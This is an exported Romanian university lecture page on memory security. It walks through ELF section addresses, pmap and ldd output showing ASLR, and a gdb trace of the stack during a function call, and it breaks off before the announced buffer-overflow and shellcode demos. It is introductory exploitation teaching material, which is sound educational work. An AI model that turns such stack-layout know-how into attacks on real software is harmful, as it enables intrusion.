    
    

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8" />
  <title>so:cursuri:curs-07</title>
<meta name="generator" content="DokuWiki"/>
<meta name="robots" content="index,follow"/>
<meta name="date" content="2016-05-22T12:05:33+0300"/>
<meta name="keywords" content="so,cursuri,curs-07"/>
<link rel="search" type="application/opensearchdescription+xml" href="../../../../lib/exe/opensearch.php" title="CS Open CourseWare"/>
<link rel="start" href="../../../../../courses.1.html"/>
<link rel="alternate" type="application/rss+xml" title="Recent Changes" href="../../../../feed.php"/>
<link rel="alternate" type="application/rss+xml" title="Current Namespace" href="../../../../feed.php%3Fmode=list&amp;ns=so:cursuri"/>
<link rel="alternate" type="text/html" title="Plain HTML" href="curs-07.html"/>
<link rel="canonical" href="../../../../so/cursuri/curs-07.html"/>
<link rel="stylesheet" type="text/css" href="../../../../lib/exe/css.php%3Ft=arctic&amp;tseed=1476798676.css"/>
<script type="text/javascript">/*<![CDATA[*/var NS='so:cursuri';var JSINFO = {"id":"so:cursuri:curs-07","namespace":"so:cursuri","isadmin":0,"isauth":0};
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="../../../../lib/exe/js.php%3Ftseed=1476798676"></script>
<script type="text/x-mathjax-config">/*<![CDATA[*/MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ["$","$"], ["\\(","\\)"] ],
        displayMath: [ ["$$","$$"], ["\\[","\\]"] ],
        processEscapes: true
    }
});
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
<script type="text/javascript">/*<![CDATA[*/
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
		  
/*!]]>*/</script>
<script type="text/javascript">/*<![CDATA[*/
var pageTracker = _gat._getTracker("UA-38383934-1");
pageTracker._initData();
pageTracker._trackPageview();
		  
/*!]]>*/</script>
</head>
<body>
<div class="dokuwiki export">
<!-- TOC START -->
<div id="dw__toc">
<h3 class="toggle">Table of Contents</h3>
<div>

<ul class="toc">
<li class="level1"><div class="li"><a href="curs-07.html#curs_07_-_securitatea_memoriei">Curs 07 - Securitatea memoriei</a></div>
<ul class="toc">
<li class="level2"><div class="li"><a href="curs-07.html#demo-uri">Demo-uri</a></div>
<ul class="toc">
<li class="level3"><div class="li"><a href="curs-07.html#sectiuni_si_adrese_in_cadrul_unui_fisier_executabil">Secțiuni și adrese în cadrul unui fișier executabil</a></div></li>
<li class="level3"><div class="li"><a href="curs-07.html#adrese_pentru_biblioteci_partajate">Adrese pentru biblioteci partajate</a></div></li>
<li class="level3"><div class="li"><a href="curs-07.html#stiva_unui_proces">Stiva unui proces</a></div>
<ul class="toc">
<li class="level4"><div class="li"><a href="curs-07.html#pornire_proces">Pornire proces</a></div></li>
<li class="level4"><div class="li"><a href="curs-07.html#apelare_de_functie">Apelare de funcție</a></div></li>
<li class="level4"><div class="li"><a href="curs-07.html#alocare_spatiu_pentru_buffer_local">Alocare spațiu pentru buffer local</a></div></li>
<li class="level4"><div class="li"><a href="curs-07.html#adresa_buffer_pe_stiva">Adresă buffer pe stivă</a></div></li>
</ul>
</li>
<li class="level3"><div class="li"><a href="curs-07.html#suprascriere_de_pointer_de_functie">Suprascriere de pointer de funcție</a></div></li>
<li class="level3"><div class="li"><a href="curs-07.html#stack_buffer_overflow_pentru_suprascriere_pointer_de_functie">Stack buffer overflow pentru suprascriere pointer de funcție</a></div></li>
<li class="level3"><div class="li"><a href="curs-07.html#stack_buffer_overflow_pentru_suprascriere_adresa_de_retur">Stack buffer overflow pentru suprascriere adresă de retur</a></div></li>
<li class="level3"><div class="li"><a href="curs-07.html#shellcode">Shellcode</a></div></li>
<li class="level3"><div class="li"><a href="curs-07.html#stack_buffer_overflow_cu_shellcode">Stack buffer overflow cu shellcode</a></div></li>
<li class="level3"><div class="li"><a href="curs-07.html#stack_buffer_overflow_cu_shellcode_pe_stiva">Stack buffer overflow cu shellcode pe stivă</a></div></li>
</ul></li>
</ul></li>
</ul>
</div>
</div>
<!-- TOC END -->

<h1 class="sectionedit1" id="curs_07_-_securitatea_memoriei">Curs 07 - Securitatea memoriei</h1>
<div class="level1">

<p>

    <iframe src="http://docs.google.com/viewer?url=http://elf.cs.pub.ro/so/res/cursuri/SO_Curs-07.pdf&embedded=true" width="600" height="480" style="border: none;">
    </iframe>

</p>
<ul>
<li class="level1"><div class="li"> <a href="http://elf.cs.pub.ro/so/res/cursuri/SO_Curs-07.pdf" class="urlextern" title="http://elf.cs.pub.ro/so/res/cursuri/SO_Curs-07.pdf"  rel="nofollow"> Curs 07 - Securitatea memoriei (PDF)</a></div>
</li>
</ul>
<ul>
<li class="level1"><div class="li"> Suport curs</div>
<ul>
<li class="level2"><div class="li"> Modern Operating Systems, 3rd Edition</div>
<ul>
<li class="level3"><div class="li"> Chapter 9: Security</div>
<ul>
<li class="level4"><div class="li"> Section 9.6: Exploiting Code Bugs</div>
</li>
</ul>
</li>
</ul>
</li>
<li class="level2"><div class="li"> Jon Erickson - Hacking: The Art of Exploitation, 2nd Edition</div>
<ul>
<li class="level3"><div class="li"> Section 0x270. Memory Segmentation</div>
</li>
<li class="level3"><div class="li"> Chapter 0x300. Exploitation</div>
</li>
</ul>
</li>
<li class="level2"><div class="li"> <a href="http://io.smashthestack.org:84/" class="urlextern" title="http://io.smashthestack.org:84/"  rel="nofollow">IO smashthestack wargame</a></div>
</li>
<li class="level2"><div class="li"> <a href="http://www.phrack.org/issues.html?issue=49&amp;id=14&amp;mode=txt" class="urlextern" title="http://www.phrack.org/issues.html?issue=49&amp;id=14&amp;mode=txt"  rel="nofollow"> Aleph One - Smashing the Stack for Fun and Profit</a></div>
</li>
<li class="level2"><div class="li"> <a href="http://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Mips/stack.html" class="urlextern" title="http://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Mips/stack.html"  rel="nofollow">Understanding the Stack</a></div>
</li>
<li class="level2"><div class="li"> <a href="http://repo.shell-storm.org/shellcode/" class="urlextern" title="http://repo.shell-storm.org/shellcode/"  rel="nofollow">Shellcodes database</a></div>
</li>
<li class="level2"><div class="li"> <a href="http://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap" class="urlextern" title="http://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap"  rel="nofollow">What and where are the stack and heap?</a></div>
</li>
</ul>
</li>
</ul>

</div>
<!-- EDIT1 SECTION "Curs 07 - Securitatea memoriei" [1-1102] -->
<h2 class="sectionedit2" id="demo-uri">Demo-uri</h2>
<div class="level2">

<p>
Pentru parcurgerea demo-urilor, folosim <a href="http://elf.cs.pub.ro/so/res/cursuri/curs-07-demo.zip" class="urlextern" title="http://elf.cs.pub.ro/so/res/cursuri/curs-07-demo.zip"  rel="nofollow">arhiva aferentă</a>. Demo-urile rulează pe Linux. Descărcăm arhiva folosind comanda
</p>
<pre class="code bash"><span class="kw2">wget</span> http:<span class="sy0">//</span>elf.cs.pub.ro<span class="sy0">/</span>so<span class="sy0">/</span>res<span class="sy0">/</span>cursuri<span class="sy0">/</span>curs-07-demo.zip</pre>

<p>
 și apoi decomprimăm arhiva
</p>
<pre class="code bash"><span class="kw2">unzip</span> curs-07-demo.zip</pre>

<p>
 și accesăm directorul rezultat în urma decomprimării
</p>
<pre class="code bash"><span class="kw3">cd</span> curs-07-demo<span class="sy0">/</span></pre>

<p>
Acum putem parcurge secțiunile cu demo-uri de mai jos.
</p>

</div>
<!-- EDIT2 SECTION "Demo-uri" [1103-1604] -->
<h3 class="sectionedit3" id="sectiuni_si_adrese_in_cadrul_unui_fisier_executabil">Secțiuni și adrese în cadrul unui fișier executabil</h3>
<div class="level3">

<p>
Dorim să urmărim adresele secțiunilor și simbolurilor în cadrul unui fișier executabil de tip ELF (<em>Executable and Linking Format</em>). Pentru aceasta accesăm subdirectorul <code>exec-addr/</code>; urmărim conținutul fișierului <code>exec-addr.c</code>. În acest fișier definim variabile globale și afișăm adresele acestor variabile și a funcțiilor din modul. Vom observa că adresele variabilelor globale și a funcțiior sunt cunoscute de la link-time, în momentul link-editării și a obținerii executabilului.
</p>

<p>
Compilăm programul folosind <code>make</code>.
</p>

<p>
Pentru început investigăm simbolurile din executabil. Ne interesează variabilele globale și funcțiile așa că vom rula comanda de afișare a simbolurilor din care vom extrage liniile de interes:
</p>
<pre class="code bash"><span class="co4">user@host:$ </span>objdump <span class="re5">--syms</span> exec-addr <span class="sy0">|</span> <span class="kw2">grep</span> <span class="st_h">'\(exec_\| main\|simple_func\)'</span>
0000000000600da0 l     O .data	0000000000000004              exec_static_int_global
000000000040076b l     F .text	000000000000001a              simple_func
0000000000600dc4 g     O .bss	0000000000000004              exec_int_global_noinit
0000000000600da4 g     O .data	0000000000000004              exec_int_global
00000000004008b8 g     O .rodata	0000000000000006              exec_array_ro
0000000000400785 g     F .text	000000000000009c              main</pre>

<p>
Prin rularea comenzii objdump de mai sus afișăm informații despre simboluri, în format pe coloane, astfel:
</p>
<ul>
<li class="level1"><div class="li"> În prima coloană sunt adresele simbolurilor. Aceste adrese se vor regăsi întocmai în proces (vom vedea în continuare). Adresele pot să difere în cazul obținerii executabilului pe alt sistem.</div>
</li>
<li class="level1"><div class="li"> A doua coloană este tipul simbolului. Simbolurile statice sunt marcate cu <code>l</code> (<em>local</em>) pentru că vor fi locale modulului. Celelalte sunt marcate cu <code>g</code> (<em>global</em>) și vor putea fi exportate în alte module.</div>
</li>
<li class="level1"><div class="li"> A patra coloană este secțiunea din executabil unde este alocat simbolul. Simbolul este alocat în modul încă de la compile-time. Secțiunile sunt după cum urmează:</div>
<ul>
<li class="level2"><div class="li"> <code>.data</code>: variabile globale inițializate</div>
</li>
<li class="level2"><div class="li"> <code>.bss</code>: variabile globale neinițializate</div>
</li>
<li class="level2"><div class="li"> <code>.rodata</code>: variabile globale de tip read-only</div>
</li>
<li class="level2"><div class="li"> <code>.text</code>: zonă de cod/instrucțiuni (pentru funcții)</div>
</li>
</ul>
</li>
<li class="level1"><div class="li"> A cincea coloană este spațiul ocupat de simbol. Variabilele întregi ocupă <code>sizeof(int) = 4</code> octeți, șirul de caractere ocupă 6 octeți (incluzând NUL-terminatorul) iar funcțiile ocupă spațiul dat de codul acestora.</div>
</li>
</ul>

<p>
Observăm că zona de date read-only (<code>.rodata</code>) este apropiată de zona de cod (<code>.text</code>) ambele fiind zone care nu pot fi scrise.
</p>

<p>
Ca să verificăm faptul că adresele precizate în executabil se vor regăsi și în momentul rulării procesului, la run-time, rulăm executabilul:
</p>
<pre class="code bash">$ .<span class="sy0">/</span>exec-addr 
Inside simple_func
&nbsp;
Run-time addresses are:
<span class="sy0">&amp;</span>exec_static_int_global: 0x600da0
<span class="sy0">&amp;</span>exec_int_global: 0x600da4
<span class="sy0">&amp;</span>exec_int_global_noinit: 0x600dc4
<span class="sy0">&amp;</span>exec_array_ro: 0x4008b8
<span class="sy0">&amp;</span>simple_func: 0x40076b
<span class="sy0">&amp;</span>main: 0x400785
&nbsp;
Run <span class="sy0">`</span>pmap <span class="re5">-p</span> $<span class="br0">&#40;</span><span class="kw2">pidof</span> exec-addr<span class="br0">&#41;</span><span class="st_h">' to show process map.
&nbsp;
     Press ENTER to continue ...</span></pre>

<p>
Observăm din rezultatul rulării că adresele de la run-time sunt aceleași cu cele din executabil.
</p>

<p>
După cum ni se indică la rulare, vom rula <code>pmap</code> pentru a consulta spațiul virtual de adresă al procesului:
</p>
<pre class="code bash">$ pmap <span class="re5">-p</span> $<span class="br0">&#40;</span><span class="kw2">pidof</span> exec-addr<span class="br0">&#41;</span>
<span class="nu0">13545</span>:   .<span class="sy0">/</span>exec-addr
0000000000400000      4K r-x-- <span class="sy0">/</span>home<span class="sy0">/</span>razvan<span class="sy0">/</span>school<span class="sy0">/</span><span class="nu0">2011</span>-<span class="nu0">2012</span><span class="sy0">/</span>so<span class="sy0">/</span>git-repos<span class="sy0">/</span>cursuri.git<span class="sy0">/</span>curs-07-demo<span class="sy0">/</span>exec-addr<span class="sy0">/</span>exec-addr
0000000000600000      4K rw--- <span class="sy0">/</span>home<span class="sy0">/</span>razvan<span class="sy0">/</span>school<span class="sy0">/</span><span class="nu0">2011</span>-<span class="nu0">2012</span><span class="sy0">/</span>so<span class="sy0">/</span>git-repos<span class="sy0">/</span>cursuri.git<span class="sy0">/</span>curs-07-demo<span class="sy0">/</span>exec-addr<span class="sy0">/</span>exec-addr
00007fd884842000   1664K r-x-- <span class="sy0">/</span>lib<span class="sy0">/</span>x86_64-linux-gnu<span class="sy0">/</span>libc-<span class="nu0">2.18</span>.so
00007fd8849e2000   2044K <span class="re5">-----</span> <span class="sy0">/</span>lib<span class="sy0">/</span>x86_64-linux-gnu<span class="sy0">/</span>libc-<span class="nu0">2.18</span>.so
00007fd884be1000     16K r---- <span class="sy0">/</span>lib<span class="sy0">/</span>x86_64-linux-gnu<span class="sy0">/</span>libc-<span class="nu0">2.18</span>.so
00007fd884be5000      8K rw--- <span class="sy0">/</span>lib<span class="sy0">/</span>x86_64-linux-gnu<span class="sy0">/</span>libc-<span class="nu0">2.18</span>.so
00007fd884be7000     16K rw---   <span class="br0">&#91;</span> anon <span class="br0">&#93;</span>
00007fd884beb000    128K r-x-- <span class="sy0">/</span>lib<span class="sy0">/</span>x86_64-linux-gnu<span class="sy0">/</span>ld-<span class="nu0">2.18</span>.so
00007fd884dcf000     12K rw---   <span class="br0">&#91;</span> anon <span class="br0">&#93;</span>
00007fd884e06000     16K rw---   <span class="br0">&#91;</span> anon <span class="br0">&#93;</span>
00007fd884e0a000      4K r---- <span class="sy0">/</span>lib<span class="sy0">/</span>x86_64-linux-gnu<span class="sy0">/</span>ld-<span class="nu0">2.18</span>.so
00007fd884e0b000      4K rw--- <span class="sy0">/</span>lib<span class="sy0">/</span>x86_64-linux-gnu<span class="sy0">/</span>ld-<span class="nu0">2.18</span>.so
00007fd884e0c000      4K rw---   <span class="br0">&#91;</span> anon <span class="br0">&#93;</span>
00007fffb51d1000    132K rw---   <span class="br0">&#91;</span> stack <span class="br0">&#93;</span>
00007fffb51fe000      8K r-x--   <span class="br0">&#91;</span> anon <span class="br0">&#93;</span>
ffffffffff600000      4K r-x--   <span class="br0">&#91;</span> anon <span class="br0">&#93;</span>
 total             4068K</pre>

<p>
Legat de partea de executabil, observăm că avem două pagini (<code>4K</code>) mapate din executabilul <code>exec-addr</code>. Una este readable/executable (<code>r-x</code>) și începe de la adresa <code>0x400000</code>, iar alta este readable/writable (<code>rw-</code>) și începe de la adresa <code>0x600000</code>. În prima pagină sunt mapate secțiunile <code>.text</code> și <code>.rodata</code>, iar în cealaltă sunt mapate secțiunile <code>.data</code> și <code>.bss</code>; observăm acest lucru pe baza adreselor.
</p>

</div>
<!-- EDIT3 SECTION "Secțiuni și adrese în cadrul unui fișier executabil" [1605-6501] -->
<h3 class="sectionedit4" id="adrese_pentru_biblioteci_partajate">Adrese pentru biblioteci partajate</h3>
<div class="level3">

<p>
Vrem să vedem cum ajung informațiile (date și instrucțiuni) dintr-o bibliotecă partajată într-un executabil. Pentru aceasta urmărim rularea comenzii <code>pmap</code> de la secțiunea anterioară.
</p>

<p>
În cadrul comenzii observăm că atât fișierul executabil care a generat procesul (<code>exec-addr</code>) cât și fișierele de tip bibliotecă partajată sunt mapate în memorie. Fișierele de tip bibliotecă partajată sunt tot fișiere ELF, cu secțiuni și simboluri similare unui fișier executabil obișnuit. Observăm că pentru fiecare bibliotecă avem, în cadrul procesului (output-ul comenzii) mai multe zone de dimensiuni și permisiuni diferite, mapate în spațiul de adresă al procesului. Astfel, pentru o bibliotecă putem avea:
</p>
<ul>
<li class="level1"><div class="li"> o zonă readable/executable (<code>r-x</code>) pentru cod/instrucțiuni (secțiunea <code>.text</code>)</div>
</li>
<li class="level1"><div class="li"> o zonă read-only (<code>r–</code>) pentru date read-only (secțiunea <code>.rodata</code>)</div>
</li>
<li class="level1"><div class="li"> o zonă read-write (<code>rw-</code>) pentru date read-write (secțiunile <code>.data</code>, <code>.bss</code>)</div>
</li>
</ul>

<p>
Bibliotecile dinamice nu sunt, în general, mapate la o adresă predefinită. De aceea, dacă rulăm de mai multe ori executabilul și apoi comanda <code>pmap</code> vom vedea că zonele din biblioteci sunt mapate la adrese diferite de fiecare dată. Acest lucru se întâmplă din rațiuni de securitate folosind ASLR (<em>Address Space Layout Randomization</em>). Dacă un atacator vrea să folosească adrese din cadrul spațiului de adresă al procesului îi va fi dificil pentru că nu știe unde sunt mapate.
</p>

<p>
Acest lucru poate fi observat prin rularea de mai multe ori a comenzii <code>ldd</code> peste executabil. La fiecare rulare va fi vorba de altă adresă unde va fi mapată biblioteca:
</p>
<pre class="code bash">$ <span class="kw2">ldd</span> exec-addr
	linux-vdso.so.1 <span class="br0">&#40;</span>0x00007fff399fe000<span class="br0">&#41;</span>
	libc.so.6 =<span class="sy0">&gt;</span> <span class="sy0">/</span>lib<span class="sy0">/</span>x86_64-linux-gnu<span class="sy0">/</span>libc.so.6 <span class="br0">&#40;</span>0x00007f8614d8a000<span class="br0">&#41;</span>
	<span class="sy0">/</span>lib64<span class="sy0">/</span>ld-linux-x86-<span class="nu0">64</span>.so.2 <span class="br0">&#40;</span>0x00007f861516b000<span class="br0">&#41;</span>
$ <span class="kw2">ldd</span> exec-addr
	linux-vdso.so.1 <span class="br0">&#40;</span>0x00007fff7a7b4000<span class="br0">&#41;</span>
	libc.so.6 =<span class="sy0">&gt;</span> <span class="sy0">/</span>lib<span class="sy0">/</span>x86_64-linux-gnu<span class="sy0">/</span>libc.so.6 <span class="br0">&#40;</span>0x00007ff7c3dfc000<span class="br0">&#41;</span>
	<span class="sy0">/</span>lib64<span class="sy0">/</span>ld-linux-x86-<span class="nu0">64</span>.so.2 <span class="br0">&#40;</span>0x00007ff7c41dd000<span class="br0">&#41;</span></pre>

</div>
<!-- EDIT4 SECTION "Adrese pentru biblioteci partajate" [6502-8584] -->
<h3 class="sectionedit5" id="stiva_unui_proces">Stiva unui proces</h3>
<div class="level3">

<p>
Dorim să urmărim evoluția stivei unui proces raportat la fluxul de execuție al acestuia (apeluri de funcții și rulare de instrucțiuni). Pentru aceasta accesăm subdirectorul <code>stack/</code>; urmărim conținutul fișierului <code>stack.c</code>. În acest fișier din funcția <code>main</code> apelăm funcția <code>read_data</code>; funcția <code>read_data</code> definește un pointer de funcție (<code>func_ptr</code>) și un buffer (<code>buffer</code>). Pe moment nu ne interesează funcționalitatea mai mult de atât.
</p>

<p>
Compilăm programul folosind <code>make</code>.
</p>

</div>

<h4 id="pornire_proces">Pornire proces</h4>
<div class="level4">

<p>
Vrem să urmărim evoluția stivei în momentul în care programul apelează funcția <code>read_data</code>. Pentru aceasta vom rula programul în debugger (<code>gdb</code>) și vom afișa codul dezasamblat, stiva, registrul de stivă/stack pointer-ul (<code>esp</code>), registrul de instrucțiune/instruction pointer-ul/program counter-ul (<code>eip</code>) sau frame pointer-ul (<code>ebp</code>).
</p>

<p>
Pentru început pornim programul și investigăm codul dezasamblat, instruction pointer-ul, stack pointer-ul și stiva:
</p>
<pre class="code bash">$ <span class="kw2">gdb</span> <span class="re5">-q</span> .<span class="sy0">/</span>stack
Reading symbols from <span class="sy0">/</span>home<span class="sy0">/</span>razvan<span class="sy0">/</span>school<span class="sy0">/</span><span class="nu0">2011</span>-<span class="nu0">2012</span><span class="sy0">/</span>so<span class="sy0">/</span>git-repos<span class="sy0">/</span>cursuri.git<span class="sy0">/</span>curs-07-demo<span class="sy0">/</span>stack<span class="sy0">/</span>stack...done.
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> b main
Breakpoint <span class="nu0">1</span> at 0x80485aa: <span class="kw2">file</span> stack.c, line <span class="nu0">37</span>.
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> run
Starting program: <span class="sy0">/</span>home<span class="sy0">/</span>razvan<span class="sy0">/</span>school<span class="sy0">/</span><span class="nu0">2011</span>-<span class="nu0">2012</span><span class="sy0">/</span>so<span class="sy0">/</span>git-repos<span class="sy0">/</span>cursuri.git<span class="sy0">/</span>curs-07-demo<span class="sy0">/</span>stack<span class="sy0">/</span>.<span class="sy0">/</span>stack 
warning: Could not load shared library symbols <span class="kw1">for</span> linux-gate.so.1.
Do you need <span class="st0">&quot;set solib-search-path&quot;</span> or <span class="st0">&quot;set sysroot&quot;</span>?
&nbsp;
Breakpoint <span class="nu0">1</span>, main <span class="br0">&#40;</span><span class="br0">&#41;</span> at stack.c:<span class="nu0">37</span>
<span class="nu0">37</span>		size_t len = <span class="nu0">0</span>;
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> disassemble
Dump of assembler code <span class="kw1">for</span> <span class="kw1">function</span> main:
   0x080485a1 <span class="sy0">&lt;</span>+<span class="nu0">0</span><span class="sy0">&gt;</span>:	push   <span class="sy0">%</span>ebp
   0x080485a2 <span class="sy0">&lt;</span>+<span class="nu0">1</span><span class="sy0">&gt;</span>:	mov    <span class="sy0">%</span>esp,<span class="sy0">%</span>ebp
   0x080485a4 <span class="sy0">&lt;</span>+<span class="nu0">3</span><span class="sy0">&gt;</span>:	and    <span class="re4">$0</span>xfffffff0,<span class="sy0">%</span>esp
   0x080485a7 <span class="sy0">&lt;</span>+<span class="nu0">6</span><span class="sy0">&gt;</span>:	sub    <span class="re4">$0</span>x20,<span class="sy0">%</span>esp
=<span class="sy0">&gt;</span> 0x080485aa <span class="sy0">&lt;</span>+<span class="nu0">9</span><span class="sy0">&gt;</span>:	call   0x804853f <span class="sy0">&lt;</span>read_data<span class="sy0">&gt;</span>
   0x080485af <span class="sy0">&lt;</span>+<span class="nu0">14</span><span class="sy0">&gt;</span>:	mov    <span class="sy0">%</span>eax,0x1c<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x080485b3 <span class="sy0">&lt;</span>+<span class="nu0">18</span><span class="sy0">&gt;</span>:	mov    0x1c<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>,<span class="sy0">%</span>eax
   0x080485b7 <span class="sy0">&lt;</span>+<span class="nu0">22</span><span class="sy0">&gt;</span>:	mov    <span class="sy0">%</span>eax,0x4<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x080485bb <span class="sy0">&lt;</span>+<span class="nu0">26</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x80486b8,<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x080485c2 <span class="sy0">&lt;</span>+<span class="nu0">33</span><span class="sy0">&gt;</span>:	call   0x8048390 <span class="sy0">&lt;</span><span class="kw3">printf</span><span class="sy0">@</span>plt<span class="sy0">&gt;</span>
   0x080485c7 <span class="sy0">&lt;</span>+<span class="nu0">38</span><span class="sy0">&gt;</span>:	mov    <span class="re4">$0</span>x0,<span class="sy0">%</span>eax
   0x080485cc <span class="sy0">&lt;</span>+<span class="nu0">43</span><span class="sy0">&gt;</span>:	leave  
   0x080485cd <span class="sy0">&lt;</span>+<span class="nu0">44</span><span class="sy0">&gt;</span>:	ret
End of assembler dump.
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> p <span class="re1">$eip</span>
<span class="re4">$1</span> = <span class="br0">&#40;</span>void <span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> 0x80485aa <span class="sy0">&lt;</span>main+<span class="nu0">9</span><span class="sy0">&gt;</span>
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> p <span class="re1">$esp</span>
<span class="re4">$2</span> = <span class="br0">&#40;</span>void <span class="sy0">*</span><span class="br0">&#41;</span> 0xffffd290
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> x<span class="sy0">/</span>2wx <span class="re1">$esp</span>
0xffffd290:	0x00000001	0xffffd354</pre>

<p>
În secvența de mai sus, am folosit breakpoint pentru <code>main</code> și apoi am rulat programul până la breakpoint. Instruction pointer-ul este la începutul programului (adresa <code>0x80485aa</code>), iar stack pointer-ul are valoarea <code>0xffffd290</code>. Pe stivă se găsesc valori random din ceea ce era anterior pe stivă.
</p>

</div>

<h4 id="apelare_de_functie">Apelare de funcție</h4>
<div class="level4">

<p>
Următoarea instrucțiune care va fi rulată va fi apelul funcției <code>read_data</code>. Este vorba de instrucțiunea:
</p>
<pre class="code">=&gt; 0x080485aa &lt;+9&gt;:	call   0x804853f &lt;read_data&gt;</pre>

<p>
Verificăm faptul că aceea este adresa funcției și apoi executăm acea instrucțiune; folosim <code>si</code>: <em>step instruction</em>:
</p>
<pre class="code bash"><span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> p read_data
<span class="re4">$1</span> = <span class="br0">&#123;</span>size_t <span class="br0">&#40;</span>void<span class="br0">&#41;</span><span class="br0">&#125;</span> 0x804853f <span class="sy0">&lt;</span>read_data<span class="sy0">&gt;</span>
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> si
read_data <span class="br0">&#40;</span><span class="br0">&#41;</span> at stack.c:<span class="nu0">23</span>
<span class="nu0">23</span>	<span class="br0">&#123;</span>
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> disassemble
Dump of assembler code <span class="kw1">for</span> <span class="kw1">function</span> read_data:
=<span class="sy0">&gt;</span> 0x0804853f <span class="sy0">&lt;</span>+<span class="nu0">0</span><span class="sy0">&gt;</span>:	push   <span class="sy0">%</span>ebp
   0x08048540 <span class="sy0">&lt;</span>+<span class="nu0">1</span><span class="sy0">&gt;</span>:	mov    <span class="sy0">%</span>esp,<span class="sy0">%</span>ebp
   0x08048542 <span class="sy0">&lt;</span>+<span class="nu0">3</span><span class="sy0">&gt;</span>:	sub    <span class="re4">$0</span>x38,<span class="sy0">%</span>esp
   0x08048545 <span class="sy0">&lt;</span>+<span class="nu0">6</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x804850d,-0xc<span class="br0">&#40;</span><span class="sy0">%</span>ebp<span class="br0">&#41;</span>
   0x0804854c <span class="sy0">&lt;</span>+<span class="nu0">13</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x10,0x8<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x08048554 <span class="sy0">&lt;</span>+<span class="nu0">21</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x41,0x4<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x0804855c <span class="sy0">&lt;</span>+<span class="nu0">29</span><span class="sy0">&gt;</span>:	lea    -0x1c<span class="br0">&#40;</span><span class="sy0">%</span>ebp<span class="br0">&#41;</span>,<span class="sy0">%</span>eax
   0x0804855f <span class="sy0">&lt;</span>+<span class="nu0">32</span><span class="sy0">&gt;</span>:	mov    <span class="sy0">%</span>eax,<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   0x08048562 <span class="sy0">&lt;</span>+<span class="nu0">35</span><span class="sy0">&gt;</span>:	call   0x8048400 <span class="sy0">&lt;</span>memset<span class="sy0">@</span>plt<span class="sy0">&gt;</span>
   0x08048567 <span class="sy0">&lt;</span>+<span class="nu0">40</span><span class="sy0">&gt;</span>:	movl   <span class="re4">$0</span>x8048690,<span class="br0">&#40;</span><span class="sy0">%</span>esp<span class="br0">&#41;</span>
   <span class="br0">&#91;</span>...<span class="br0">&#93;</span>
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> p <span class="re1">$eip</span>
<span class="re4">$2</span> = <span class="br0">&#40;</span>void <span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> 0x804853f <span class="sy0">&lt;</span>read_data<span class="sy0">&gt;</span>
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> p <span class="re1">$esp</span>
<span class="re4">$3</span> = <span class="br0">&#40;</span>void <span class="sy0">*</span><span class="br0">&#41;</span> 0xffffd28c
<span class="br0">&#40;</span><span class="kw2">gdb</span><span class="br0">&#41;</span> x<span class="sy0">/</span>3wx <span class="re1">$esp</span>
0xffffd28c:	0x080485af	0x00000001	0xffffd354</pre>

<p>
În rularea de mai sus am verificat faptul că apelul call se face către funcția <code>read</code> data și apoi facem apelul cu ajutorul operației <code>si</code> (<em>step instruction</em>) din GDB. Ca urmare a acestui apel au loc următoarele schimbări, echivalente pentru <code>call</code>:
</p>
<ul>
<li class="level1"><div class="li"> Se face loc pe stivă, adică stack pointer-ul este decrementat cu dimensiunea cuvântului procesului (32 de biți, 4 octeți) de la valoarea <code>0xffffd290</code> la valoarea <code>0xffffd28c</code>.</div>
</li>
<li class="level1"><div class="li"> Se scrie în acel loc pe stivă valoarea instruction pointer-ului, adică adresa următoarei instrucțiuni, în cazul nostru <code>0x080485af</code>.</div>
</li>
<li class="level1"><div class="li"> Se sare la adresa funcției <code>read_data</code>, adică <code>0x0804853f</code>.</div>
</li>
</ul>

<p>
În pseudo-assembly, cele de mai sus pot fi considerate ca:
</p>
<pre class="code">pushl   %eip          ; equivalent to pushl 0x080485af
jmp     read_data     ; equivalent to jmp 0x0804853f</pre>

</div>

<h4 id="alocare_spatiu_pentru_buffer_local">Alocare spațiu pentru buffer local</h4>
<div class="level4">

<p>
